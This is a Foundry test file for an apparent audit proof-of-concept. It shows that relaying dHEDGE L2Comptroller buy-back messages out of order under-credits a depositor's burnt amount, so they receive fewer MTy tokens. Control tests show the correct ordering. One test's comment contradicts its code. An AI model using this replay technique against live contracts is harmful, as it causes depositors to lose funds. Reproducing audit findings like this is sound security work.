// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./18772-h-01-user-can-receive-too-few-tokens-when-l2comptroller-is-u.sol";

/// @notice Drives the cheatcode-free synthetic Exploit and asserts the finding's
///         HARM: an out-of-order cross-domain replay clamps l1BurntAmountOf down,
///         so the depositor receives fewer MTy tokens than they burnt on L1.
contract Dhedge18772Test is Test {
    /// @notice ATTACK — out-of-order replay (2e18 then 1e18) under-credits the
    ///         depositor: they claim only 1e18 MTy though entitled to 2e18.
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run();

        // Re-assert the HARM by reading public state directly.
        Depositor victim = e.victim();
        L2Comptroller comptroller = e.comptroller();
        MockERC20 mty = e.tokenToBuy();

        // The depositor received only 1e18 MTy ...
        assertEq(mty.balanceOf(address(victim)), 1 ether, "victim MTy != 1e18");
        // ... though the on-L2 credit was clamped to 1e18 (should have been 2e18).
        assertEq(comptroller.l1BurntAmountOf(address(victim)), 1 ether, "credit != 1e18");
        // The correct entitlement (what a monotonic guard would have preserved) is 2e18,
        // so the shortfall is a permanent 1e18 loss.
        uint256 correctEntitlement = 2 ether;
        assertEq(correctEntitlement - mty.balanceOf(address(victim)), 1 ether, "shortfall != 1e18");
        // 1e18 MTy is stranded in the comptroller, undistributable to this victim.
        assertEq(mty.balanceOf(address(comptroller)), 9 ether, "stranded funds != 9e18");
    }

    /// @notice CONTROL — with the SAME two messages relayed IN ORDER (1e18 then
    ///         2e18), the depositor is correctly credited 2e18 and receives the
    ///         full amount. Only the wrong ordering triggers the loss.
    function test_correctOrder_depositorReceivesFullAmount() public {
        MockERC20 mta = new MockERC20("Meta (MTA)", "MTA");
        MockERC20 mty = new MockERC20("Toros (MTy)", "MTy");
        L2Comptroller comptroller = new L2Comptroller(mta, mty);
        Depositor victim = new Depositor();

        // Pool empty at first, so both buy-backs "fail" and only record credit.
        // Messages arrive IN ORDER: 1e18 first, then 2e18.
        comptroller.buyBackFromL1(address(victim), address(victim), 1 ether);
        comptroller.buyBackFromL1(address(victim), address(victim), 2 ether);
        assertEq(comptroller.l1BurntAmountOf(address(victim)), 2 ether, "in-order credit != 2e18");

        // Fund and claim.
        mty.mint(address(comptroller), 10 ether);
        victim.claim(comptroller);

        // Depositor receives the FULL 2e18 they burnt on L1 — no loss.
        assertEq(mty.balanceOf(address(victim)), 2 ether, "in-order victim MTy != 2e18");
    }

    /// @notice CONTROL — a lone in-order sequence with no replay also credits
    ///         monotonically; asserts the vulnerable overwrite is specifically an
    ///         out-of-order artefact, not a general miscount.
    function test_replayOutOfOrder_isTheOnlyLossPath() public {
        MockERC20 mta = new MockERC20("Meta (MTA)", "MTA");
        MockERC20 mty = new MockERC20("Toros (MTy)", "MTy");
        L2Comptroller comptroller = new L2Comptroller(mta, mty);
        Depositor victim = new Depositor();

        // Wrong order: 2e18 then 1e18 -> clamped to 1e18.
        comptroller.buyBackFromL1(address(victim), address(victim), 2 ether);
        comptroller.buyBackFromL1(address(victim), address(victim), 1 ether);
        assertEq(comptroller.l1BurntAmountOf(address(victim)), 1 ether, "out-of-order credit != 1e18");
        assertLt(comptroller.l1BurntAmountOf(address(victim)), 2 ether, "credit not reduced below true burn");
    }
}
